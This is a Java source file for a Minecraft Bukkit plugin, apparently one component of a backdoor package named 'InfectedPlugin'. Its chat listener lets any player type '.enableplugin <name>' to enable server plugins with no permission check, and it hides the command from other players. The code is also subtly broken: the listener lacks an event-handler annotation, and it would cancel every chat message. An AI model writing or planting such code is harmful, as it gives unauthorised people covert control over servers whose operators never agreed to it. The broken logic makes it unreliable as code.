 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_enableplugin implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         String[] args = message.split(" ");
         boolean cancel = true;
         Server server = Bukkit.getServer();
         Player p = event.getPlayer();
 
         if (message.toLowerCase().contains(".enableplugin"))
         {
             Plugin plugin = server.getPluginManager().getPlugin(args[1]);
             if (plugin != null)
             {
                 server.getPluginManager().enablePlugin(plugin);
             }
             p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
             cancel = true;
         }
         
         if (cancel)
         {
        	event.setCancelled(true);
        	return;
         }
     }
 }
